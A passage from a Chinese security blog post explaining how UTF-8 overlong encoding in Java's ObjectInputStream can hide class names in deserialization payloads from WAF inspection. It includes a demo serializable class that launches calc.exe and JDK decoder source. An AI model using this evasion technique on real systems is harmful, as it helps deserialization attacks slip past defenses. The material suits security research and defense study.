catch (Exception e){ e.printStackTrace(); } return null; } } Demo\npackage com.jie; import com.n1ght.NightTransformer; import java.io.ObjectOutputStream; import java.lang.instrument.Instrumentation; import java.lang.reflect.AccessibleObject; public class Demo { public static void premain(String args, Instrumentation inst) throws Exception { inst.addTransformer(new JieTransformer(), true); //生成transform() inst.retransformClasses(new Class[] { Object.class }); //这里只是用来触发生成transform() // 重加载某个 class, 注意在重加载 class 的过程中, 之前设置的 transformer 会拦截该 class } } MANIFEST.MF\nManifest-Version: 1.0 Can-Redefine-Classes: true Can-Retransform-Classes: true Premain-Class: com.jie.Demo 然后将这个模块生成jar包，在CC6执行添加这个-javaagent:jarpath\n看看效果图吧，属性的问题都解决了\n",
  "wordCount" : "8037",
  "inLanguage": "zh",
  "datePublished": "2024-12-12T20:01:23+08:00",
  "dateModified": "2024-12-12T20:01:23+08:00",
  "author":{
    "@type": "Person",
    "name": "Jiecub3"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://Jiecub3.github.io/zh/posts/java/bypass_waf/utf-8-overlong-encoding-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Jiecub3",
    "logo": {
      "@type": "ImageObject",
      "url": "https://Jiecub3.github.io/img/logo.gif"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://Jiecub3.github.io/zh/" accesskey="h" title="Jiecub3 (Alt + H)">Jiecub3</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://Jiecub3.github.io/zh/" title="首页">
                    <span>首页</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/archives/" title="归档">
                    <span>归档</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/categories/" title="分类">
                    <span>分类</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/search" title="搜索🔍︎">
                    <span>搜索🔍︎</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/about/" title="关于">
                    <span>关于</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://Jiecub3.github.io/zh/">🏠主页</a>&nbsp;»&nbsp;<a href="https://Jiecub3.github.io/zh/posts/">Posts</a></div>
    <h1 class="post-title entry-hint-parent">
      UTF-8 Overlong Encoding-Java反序列化
    </h1>
    <div class="post-meta"><span title='2024-12-12 20:01:23 +0800 CST'>2024-12-12</span>&nbsp;·&nbsp;17 分钟&nbsp;·&nbsp;Jiecub3

</div>
  </header> <aside id="toc-container" class="toc-container wide">
    <div class="toc">
        <details  open>
            <summary accesskey="c" title="(Alt + C)">
                <span class="details">目录</span>
            </summary>

            <div class="inner"><ul>
                    <li>
                        <a href="#0x01-%e5%89%8d%e8%a8%80" aria-label="0x01 前言">0x01 前言</a></li>
                    <li>
                        <a href="#0x02-utf-8-overlong-encoding%e5%8e%9f%e7%90%86" aria-label="0x02 UTF-8 Overlong Encoding原理">0x02 UTF-8 Overlong Encoding原理</a><ul>
                            
                    <li>
                        <a href="#utf-8%e7%bc%96%e7%a0%81" aria-label="utf-8编码">utf-8编码</a></li></ul>
                    </li>
                    <li>
                        <a href="#0x03-readobject-utf-8" aria-label="0x03 readObject UTF-8">0x03 readObject UTF-8</a><ul>
                            
                    <li>
                        <a href="#128-%e6%ac%a7%e5%85%83%e7%ac%a6%e5%8f%b7" aria-label="128 欧元符号">128 欧元符号</a></li>
                    <li>
                        <a href="#3byte" aria-label="3byte">3byte</a></li>
                    <li>
                        <a href="#real-128" aria-label="real 128">real 128</a></li></ul>
                    </li>
                    <li>
                        <a href="#0x04-%e5%bc%80%e5%a7%8b%e6%9e%84%e9%80%a0" aria-label="0x04 开始构造">0x04 开始构造</a><ul>
                            
                    <li>
                        <a href="#writeutf" aria-label="writeUTF">writeUTF</a></li>
                    <li>
                        <a href="#poc%e6%9e%84%e9%80%a0" aria-label="poc构造">poc构造</a><ul>
                            
                    <li>
                        <a href="#drain" aria-label="drain()">drain()</a></li>
                    <li>
                        <a href="#buf" aria-label="buf">buf</a></li></ul>
                    </li>
                    <li>
                        <a href="#poc1" aria-label="poc1">poc1</a></li></ul>
                    </li>
                    <li>
                        <a href="#0x05-agent" aria-label="0x05 agent">0x05 agent</a><ul>
                            
                    <li>
                        <a href="#agentmain-%e6%96%b9%e5%bc%8f" aria-label="agentmain 方式">agentmain 方式</a></li>
                    <li>
                        <a href="#%e5%ae%9e%e6%88%98" aria-label="实战">实战</a>
                    </li>
                </ul>
                </li>
                </ul>
            </div>
        </details>
    </div>
</aside>
<script>
    let activeElement;
    let elements;
    
    document.addEventListener('DOMContentLoaded', function (event) {
        checkTocPosition();
    
        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
        if (elements.length > 0) {
            
            activeElement = elements[0];
            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
        }
    
        
        const topLink = document.getElementById('top-link');
        if (topLink) {
            topLink.addEventListener('click', (event) => {
                
                event.preventDefault();
    
                
                window.scrollTo({ top: 0, behavior: 'smooth' });
            });
        }
    }, false);
    
    window.addEventListener('resize', function(event) {
        checkTocPosition();
    }, false);
    
    window.addEventListener('scroll', () => {
        
        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
    
        
        if (scrollPosition === 0) {
            return;
        }
    
        
        if (elements && elements.length > 0) {
            
            activeElement = Array.from(elements).find((element) => {
                if ((getOffsetTop(element) - scrollPosition) > 0 && 
                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
                    return element;
                }
            }) || activeElement;
    
            elements.forEach(element => {
                const id = encodeURI(element.getAttribute('id')).toLowerCase();
                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
                if (element === activeElement){
                    tocLink.classList.add('active');
    
                    
                    const tocContainer = document.querySelector('.toc .inner');
                    const linkOffsetTop = tocLink.offsetTop;
                    const containerHeight = tocContainer.clientHeight;
                    const linkHeight = tocLink.clientHeight;
    
                    
                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
                } else {
                    tocLink.classList.remove('active');
                }
            });
        }
    }, false);
    
    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
    
    function checkTocPosition() {
        const width = document.body.scrollWidth;
    
        if (width - main - (toc * 2) - (gap * 4) > 0) {
            document.getElementById("toc-container").classList.add("wide");
        } else {
            document.getElementById("toc-container").classList.remove("wide");
        }
    }
    
    function getOffsetTop(element) {
        if (!element.getClientRects().length) {
            return 0;
        }
        let rect = element.getBoundingClientRect();
        let win = element.ownerDocument.defaultView;
        return rect.top + win.pageYOffset;   
    }
    
</script>

  <div class="post-content"><h2 id="0x01-前言">0x01 前言<a hidden class="anchor" aria-hidden="true" href="#0x01-前言">#</a></h2>
<p><a href="https://t.zsxq.com/17LkqCzk8">Java反序列化中应用</a> @1ue</p>
<p><a href="https://www.leavesongs.com/PENETRATION/utf-8-overlong-encoding.html">UTF-8 Overlong Encoding原理</a> @p牛</p>
<blockquote>
<p>拜读上面两篇文章后，感觉挺有意思的，跟着1ue师傅的文章再分析了下，这里<code>UTF-8 Overlong Encoding</code>在java中解决了流量的监测的绕过，让<code>明文类名</code>在流量上不再是ascii中的字符，但是反序列化又能解析成正常数据，绕过waf拦截，但是分析完发现加密对应的值是固定的，不过可以2，3byte<code>交叉混洗</code>。</p>
</blockquote>
<p>下文对utf-8在反序列化中的原理进行了解析，然后构造poc并改进poc，实现<code>全字段加密</code></p>
<h2 id="0x02-utf-8-overlong-encoding原理">0x02 UTF-8 Overlong Encoding原理<a hidden class="anchor" aria-hidden="true" href="#0x02-utf-8-overlong-encoding原理">#</a></h2>
<p>这里大概解释下原理，具体也可以看p牛文章</p>
<h3 id="utf-8编码">utf-8编码<a hidden class="anchor" aria-hidden="true" href="#utf-8编码">#</a></h3>
<p>参考这个表格，用于将unicode码转换成UTF-8编码：</p>
<table>
<thead>
<tr>
<th style="text-align:center">First code point</th>
<th style="text-align:center">Last code point</th>
<th style="text-align:center">Byte 1</th>
<th style="text-align:center">Byte 2</th>
<th style="text-align:center">Byte 3</th>
<th style="text-align:center">Byte 4</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">U+0000</td>
<td style="text-align:center">U+007F</td>
<td style="text-align:center">0xxxxxxx</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">U+0080</td>
<td style="text-align:center">U+07FF</td>
<td style="text-align:center">110xxxxx</td>
<td style="text-align:center">10xxxxxx</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">U+0800</td>
<td style="text-align:center">U+FFFF</td>
<td style="text-align:center">1110xxxx</td>
<td style="text-align:center">10xxxxxx</td>
<td style="text-align:center">10xxxxxx</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">U+10000</td>
<td style="text-align:center">U+10FFFF</td>
<td style="text-align:center">11110xxx</td>
<td style="text-align:center">10xxxxxx</td>
<td style="text-align:center">10xxxxxx</td>
<td style="text-align:center">10xxxxxx</td>
</tr>
</tbody>
</table>
<p>及当<code>字符uincode编码</code>超过<code>U+007F</code>时，<code>UTF-8</code>会用<code>多个Byte</code>来代表这个字符(U+0080-U+07FF这个范围就<code>2个Byte</code>，其他范围见上表)</p>
<blockquote>
<p>这种方式看似也没毛病，但是当我们把本身是<code>1Byte字符</code>，按照<code>2Byte的格式</code>（上图）构造会发生什么呢</p>
</blockquote>
<p>P牛用点号<code>.</code>举了个例子，其unicode编码和ascii编码一致，均为<code>0x2E</code>。按照上表，它只能被编码成单字节的UTF-8字符，但我按照下面的方法进行转换：</p>
<ul>
<li><code>0x2E</code>的二进制是<code>10 1110</code>，我给其前面补5个0，变成<code>00000101110</code></li>
<li>将其分成5位、6位两组：<code>00000</code>，<code>101110</code></li>
<li>分别给这两组增加前缀<code>110</code>，<code>10</code>，结果是<code>11000000</code>，<code>10101110</code>，对应的是<code>\xC0\xAE</code></li>
</ul>
<p><strong><code>0xC0AE</code>并不是一个合法的UTF-8字符，但我们确实是按照UTF-8编码方式将其转换出来的</strong>，这就是UTF-8设计中的一个缺陷。</p>
<p>这个问题在python中已经修复过了，但是java任然存在（我觉得java可以utf-8转化后再进行一次范围判断，1byte是小于127的）</p>
<p>那我们进入正题，看看<code>UTF-8 Overlong Encoding</code>在java反序列化中的应用，反序列化存在这个问题是因为反序列化和反序列化将字符转换的方式正是上面utf-8到uincode这种模式进行转换的。</p>
<h2 id="0x03-readobject-utf-8">0x03 readObject UTF-8<a hidden class="anchor" aria-hidden="true" href="#0x03-readobject-utf-8">#</a></h2>
<p>这里可以跟着1ue师傅文章看</p>
<p>demo方便调试</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">UTF8</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectInputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.Serializable</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">evil</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">Serializable</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">readObject</span><span class="p">(</span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">ois</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">ClassNotFoundException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ois</span><span class="p">.</span><span class="na">defaultReadObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="s">&#34;calc.exe&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>开始debug，观测<code>readObject</code>是何时拿取<code>className</code>的</p>
<p>这里1ue师傅给出了调用链</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ObjectStreamClass#readNonProxy(ObjectInputStream in)
</span></span><span class="line"><span class="cl">	ObjectInputStream#readUTF()
</span></span><span class="line"><span class="cl">		BlockDataInputStream#readUTF()
</span></span><span class="line"><span class="cl">			ObjectInputStream#readUTFBody(long utflen)
</span></span><span class="line"><span class="cl">				ObjectInputStream#readUTFSpan(StringBuilder sbuf, long utflen)
</span></span></code></pre></div><p>关键点就在<code>readUTFSpan()</code>，反序列化evil类，打个断点，我们直接看这个函数干了啥</p>
<blockquote>
<p><code>utflen</code>是获取的<code>类名的长度</code>，然后while执行<code>stop-pos(一般就是utflen)</code>次，来解析类名的每个字符存储到<code>cbuf</code>，最后再添加到<code>sbuf</code>，问题就在解析每个字节的时候</p>
<p>从注释能一眼发现，是存在UTF-8编码规则的问题，下文结合图片分析问题</p>
</blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">private</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="nf">readUTFSpan</span><span class="p">(</span><span class="n">StringBuilder</span><span class="w"> </span><span class="n">sbuf</span><span class="p">,</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">utflen</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">cpos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">start</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pos</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">avail</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Math</span><span class="p">.</span><span class="na">min</span><span class="p">(</span><span class="n">end</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">pos</span><span class="p">,</span><span class="w"> </span><span class="n">CHAR_BUF_SIZE</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// stop short of last char unless all of utf bytes in buffer</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">stop</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pos</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">((</span><span class="n">utflen</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">avail</span><span class="p">)</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="n">avail</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">2</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="w"> </span><span class="n">utflen</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kt">boolean</span><span class="w"> </span><span class="n">outOfBounds</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">pos</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">stop</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kt">int</span><span class="w"> </span><span class="n">b1</span><span class="p">,</span><span class="w"> </span><span class="n">b2</span><span class="p">,</span><span class="w"> </span><span class="n">b3</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">b1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">buf</span><span class="o">[</span><span class="n">pos</span><span class="o">++]</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0xFF</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">switch</span><span class="w"> </span><span class="p">(</span><span class="n">b1</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">4</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">case</span><span class="w"> </span><span class="n">0</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">case</span><span class="w"> </span><span class="n">1</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">case</span><span class="w"> </span><span class="n">2</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">case</span><span class="w"> </span><span class="n">3</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">case</span><span class="w"> </span><span class="n">4</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">case</span><span class="w"> </span><span class="n">5</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">case</span><span class="w"> </span><span class="n">6</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">case</span><span class="w"> </span><span class="n">7</span><span class="p">:</span><span class="w">   </span><span class="c1">// 1 byte format: 0xxxxxxx</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">cbuf</span><span class="o">[</span><span class="n">cpos</span><span class="o">++]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="w"> </span><span class="n">b1</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">break</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">case</span><span class="w"> </span><span class="n">12</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">case</span><span class="w"> </span><span class="n">13</span><span class="p">:</span><span class="w">  </span><span class="c1">// 2 byte format: 110xxxxx 10xxxxxx</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">b2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">buf</span><span class="o">[</span><span class="n">pos</span><span class="o">++]</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">b2</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0xC0</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">0x80</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UTFDataFormatException</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">cbuf</span><span class="o">[</span><span class="n">cpos</span><span class="o">++]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="w"> </span><span class="p">(((</span><span class="n">b1</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x1F</span><span class="p">)</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="n">6</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                                           </span><span class="p">((</span><span class="n">b2</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x3F</span><span class="p">)</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="n">0</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">break</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">case</span><span class="w"> </span><span class="n">14</span><span class="p">:</span><span class="w">  </span><span class="c1">// 3 byte format: 1110xxxx 10xxxxxx 10xxxxxx</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">b3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">buf</span><span class="o">[</span><span class="n">pos</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">1</span><span class="o">]</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">b2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">buf</span><span class="o">[</span><span class="n">pos</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">0</span><span class="o">]</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">pos</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">2</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">b2</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0xC0</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">0x80</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="p">(</span><span class="n">b3</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0xC0</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">0x80</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UTFDataFormatException</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">cbuf</span><span class="o">[</span><span class="n">cpos</span><span class="o">++]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="w"> </span><span class="p">(((</span><span class="n">b1</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x0F</span><span class="p">)</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="n">12</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                                           </span><span class="p">((</span><span class="n">b2</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x3F</span><span class="p">)</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="n">6</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                                           </span><span class="p">((</span><span class="n">b3</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x3F</span><span class="p">)</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="n">0</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">break</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">default</span><span class="p">:</span><span class="w">  </span><span class="c1">// 10xx xxxx, 1111 xxxx</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UTFDataFormatException</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">ArrayIndexOutOfBoundsException</span><span class="w"> </span><span class="n">ex</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">outOfBounds</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">finally</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">outOfBounds</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="p">(</span><span class="n">pos</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">start</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">utflen</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">             * Fix for 4450867: if a malformed utf char causes the
</span></span></span><span class="line"><span class="cl"><span class="cm">             * conversion loop to scan past the expected end of the utf
</span></span></span><span class="line"><span class="cl"><span class="cm">             * string, only consume the expected number of utf bytes.
</span></span></span><span class="line"><span class="cl"><span class="cm">             */</span><span class="w">
